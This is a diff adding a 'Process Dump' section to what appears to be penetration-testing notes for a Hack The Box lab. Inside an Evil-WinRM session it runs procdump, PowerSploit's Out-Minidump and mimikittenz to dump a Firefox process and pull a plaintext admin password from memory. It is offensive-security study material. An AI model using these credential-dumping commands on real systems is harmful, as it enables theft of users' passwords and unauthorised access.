@@ -258,6 +258,88 @@ Rule Name:                            @{Microsoft.StorePurchaseApp_12109.1001.10
 <...SNIP...>
 ```
 
+## Process Dump
+
+We can the information of a process with procdump.exe from Sysinternals.
+
+```powershell
+*Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump64 -ma 6252 -accepteula
+
+ProcDump v9.0 - Sysinternals process dump utility
+Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+[02:54:30] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_190823_025430.dmp
+[02:54:30] Dump 1 writing: Estimated dump file size is 280 MB.
+[02:54:32] Dump 1 complete: 281 MB written in 2.1 seconds
+[02:54:33] Dump count reached.
+```
+
+Alternatively, we can use PowerSploit’s Out-Minidump:
+
+```powershell
+*Evil-WinRM* PS C:\users\chase\appdata\local\temp> Out-Minidump.ps1
+*Evil-WinRM* PS C:\users\chase\appdata\local\temp> menu
+
+   ___ __ __  ____  _
+  /  _]  |  ||    || |
+ /  [_|  |  | |  | | |
+|    _]  |  | |  | | |___
+|   [_|  :  | |  | |     |
+|     |\   /  |  | |     |
+|_____| \_/  |____||_____|
+
+ __    __  ____  ____   ____   ___ ___
+|  |__|  ||    ||    \ |    \ |   |   |
+|  |  |  | |  | |  _  ||  D  )| _   _ |
+|  |  |  | |  | |  |  ||    / |  \_/  |
+|  `  '  | |  | |  |  ||    \ |   |   |
+ \      /  |  | |  |  ||  .  \|   |   |
+  \_/\_/  |____||__|__||__|\_||___|___|
+
+
+                           By: CyberVaca@HackPlayers
+
+[+] Invoke-Binary
+[+] l04d3r-LoadDll
+[+] Out-Minidump
+
+*Evil-WinRM* PS C:\users\chase\appdata\local\temp> get-process -id 6252 | Out-Minidump
+
+
+    Directory: C:\users\chase\appdata\local\temp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        8/23/2019  11:09 PM      286666409 firefox_6252.dmp
+```
+
+Mimikittenz is a tool that can dump process that may have passwords:
+
+```powershell
+*Evil-WinRM* PS C:\Users\Chase\Documents> Invoke-mimikittenz
+───▐▀▄──────▄▀▌───▄▄▄▄▄▄▄─────────────
+───▌▒▒▀▄▄▄▄▀▒▒▐▄▀▀▒██▒██▒▀▀▄──────────
+──▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄────────
+──▌▒▒▒▒▒▒▒▒▒▒▒▒▒▄▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄──────
+▀█▒▒█▌▒▒█▒▒▐█▒▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌─────
+▀▌▒▒▒▒▒▀▒▀▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐───▄▄
+▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌▄█▒█
+▐▒▒▒▒mimikittenz-1.0-alpha▒▒▒▒▒▒▒▒▒▐▒█▀─
+▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▀───
+▐▒▒▒▒▒▒CAN I HAZ WAM?▒▒▒▒▒▒▒▒▒▒▒▒▌────
+─▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐─────
+─▐▒▒▒jamieson@dringensec.com▒▒▒▒▌─────
+──▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐──────
+──▐▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▌──────
+────▀▄▄▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀────────
+
+PatternName PatternMatch
+----------- ------------
+Heist       login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+```
+
 ## Scheduled Tasks
 
 Enumerate scheduled tasks with `schtasks`:
